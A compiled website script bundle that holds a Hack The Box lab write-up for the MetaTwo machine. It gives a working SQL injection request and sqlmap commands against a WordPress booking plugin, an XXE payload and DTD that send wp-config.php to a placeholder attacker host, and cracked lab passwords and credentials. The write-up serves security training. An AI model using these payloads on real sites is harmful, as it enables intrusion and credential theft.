"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[4506],{21327:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>c,contentTitle:()=>r,default:()=>p,frontMatter:()=>i,metadata:()=>o,toc:()=>d});var t=n(74848),a=n(28453);const i={},r="MetaTwo",o={id:"writeups/htb/metatwo/index",title:"MetaTwo",description:"A writeup for the machine MetaTwo on Hack The Box.",source:"@site/docs/writeups/htb/metatwo/index.md",sourceDirName:"writeups/htb/metatwo",slug:"/writeups/htb/metatwo/",permalink:"/docs/writeups/htb/metatwo/",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/htb/metatwo/index.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Analytics",permalink:"/docs/writeups/htb/analytics/"},next:{title:"Perfection",permalink:"/docs/writeups/htb/perfection/"}},c={},d=[{value:"Footprinting",id:"footprinting",level:2},{value:"Nmap scan",id:"nmap-scan",level:3},{value:"Web server",id:"web-server",level:3},{value:"User flag",id:"user-flag",level:2},{value:"Exploiting Wordpress",id:"exploiting-wordpress",level:3},{value:"Accessing with SSH",id:"accessing-with-ssh",level:3}];function l(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,a.R)(),...e.components},{Image:i}=s;return i||function(e,s){throw new Error("Expected "+(s?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Image",!0),(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(s.h1,{id:"metatwo",children:"MetaTwo"}),"\n",(0,t.jsxs)(s.p,{children:["A writeup for the machine ",(0,t.jsx)(s.a,{href:"https://app.hackthebox.com/machines/MetaTwo",children:"MetaTwo"})," on Hack The Box."]}),"\n",(0,t.jsx)(i,{src:n(20036).A,height:"500"}),"\n",(0,t.jsx)(s.h2,{id:"footprinting",children:"Footprinting"}),"\n",(0,t.jsx)(s.h3,{id:"nmap-scan",children:"Nmap scan"}),"\n",(0,t.jsxs)(s.p,{children:["By scanning with nmap we can find three open ports. In particular, on port 80 there is a website available based on Wordpress at the address ",(0,t.jsx)(s.code,{children:"metapress.htb"})]}),"\n",(0,t.jsx)(i,{src:n(92329).A}),"\n",(0,t.jsx)(s.h3,{id:"web-server",children:"Web server"}),"\n",(0,t.jsx)(s.p,{children:"By looking to the source code of the index it is possible to see that the website uses Wordpress."}),"\n",(0,t.jsx)(i,{src:n(79457).A}),"\n",(0,t.jsx)(s.h2,{id:"user-flag",children:"User flag"}),"\n",(0,t.jsx)(s.h3,{id:"exploiting-wordpress",children:"Exploiting Wordpress"}),"\n",(0,t.jsx)(s.p,{children:"We can also notice that a plugin called bookingpress-appointment-booking is used. with version 1.0.10. It is enough to search on Google for vulnerabilities to find a SQLi."}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.a,{href:"https://wordpress.org/plugins/bookingpress-appointment-booking/",children:"https://wordpress.org/plugins/bookingpress-appointment-booking/"})}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.a,{href:"https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357",children:"https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357"})}),"\n",(0,t.jsx)(s.p,{children:"The SQLi is:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'\n"})}),"\n",(0,t.jsx)(s.p,{children:"Enumerate dbs"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --dbs\n"})}),"\n",(0,t.jsx)(s.p,{children:"Enumerate users"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch -D blog -T wp_users --dump\n"})}),"\n",(0,t.jsx)(s.p,{children:"Get password of admin and manager users"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3187120274&category_id=33&total_service=1' -p total_service --batch --sql-query \"SELECT user_pass FROM wp_users WHERE ID=1\"\n"})}),"\n",(0,t.jsx)(i,{src:n(85456).A}),"\n",(0,t.jsx)(s.p,{children:"Final hashes"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{children:"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. admin\n$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 manager\n"})}),"\n",(0,t.jsxs)(s.p,{children:["Using hashcat and the rockyou list is possible to find the password for manager: ",(0,t.jsx)(s.code,{children:"partylikearockstar"}),"."]}),"\n",(0,t.jsx)(i,{src:n(55869).A}),"\n",(0,t.jsx)(s.p,{children:"Once inside we can try to exploit the permissions of the manager user.\nWe can use tool like Wappalyzer to find the version of Wordpress used by the website (5.6.2)."}),"\n",(0,t.jsx)(s.p,{children:"There is a vulnerability that exploits the upload of a new media element to the website. The vulnerability is described here:"}),"\n",(0,t.jsx)(s.p,{children:(0,t.jsx)(s.a,{href:"https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5",children:"https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5"})}),"\n",(0,t.jsx)(s.p,{children:"One file will be used for upload:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-xml",metastring:'title="payload.wav"',children:'RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM "http://ATTACKER_IP:ATTACKER_PORT/xxe.dtd">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n'})}),"\n",(0,t.jsx)(s.p,{children:"Another will be server on the attacker machine:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-xml",metastring:'title="xxe.dtd"',children:'<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://ATTACKER_IP:ATTACKER_PORT/?%data;\'>">\n'})}),"\n",(0,t.jsx)(s.p,{children:"Change ATTACKER_IP and ATTACKER_PORT with your values."}),"\n",(0,t.jsx)(s.p,{children:"Remember to serve the file on your local pc:"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"python3 -m http.server PORT\n"})}),"\n",(0,t.jsxs)(s.p,{children:["In the ",(0,t.jsx)(s.code,{children:"wp-config.php"})," we can find the credentials for the ftp server:"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-php",metastring:'title="wp-config.php"',children:"...\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\n...\n"})}),"\n",(0,t.jsx)(i,{src:n(8058).A}),"\n",(0,t.jsxs)(s.p,{children:["In addition to the blog files, there is also a folder called ",(0,t.jsx)(s.code,{children:"mailer"})," where we can find a file ",(0,t.jsx)(s.code,{children:"send_email.php"}),".\nInside the file we can find the credentials for the mail server:"]}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-php",metastring:'title="send_email.php"',children:'$mail->Username = "jnelson@metapress.htb";\n$mail->Password = "Cb4_JmWM8zUZWMu@Ys";\n'})}),"\n",(0,t.jsx)(s.h3,{id:"accessing-with-ssh",children:"Accessing with SSH"}),"\n",(0,t.jsx)(s.p,{children:"We can use the credentials that we found to login via SSH."}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"ssh jnelson@TARGET_IP\n"})}),"\n",(0,t.jsx)(s.p,{children:"Once inside the machine, we can find the user flag inside the home directory."}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"cat user.txt\n"})})]})}function p(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},20036:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/banner-6bf08d7480fdb1b3ba333cdc06d69dff.png"},8058:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/ftp-c410d670e94a9f2292aad2f0f3a745e8.png"},55869:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/manager-473a8781c7bf9159093e39f1b700a715.png"},92329:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/nmap-d8fa87943da421004eb7fb7fd4f7f5a1.png"},79457:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/source-96d14d08f9316bb9c625942bb8d99a2c.png"},85456:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/sqlmap-bddcca3aab60391157a144209c193f73.png"},28453:(e,s,n)=>{n.d(s,{R:()=>r,x:()=>o});var t=n(96540);const a={},i=t.createContext(a);function r(e){const s=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function o(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),t.createElement(i.Provider,{value:s},e.children)}}}]);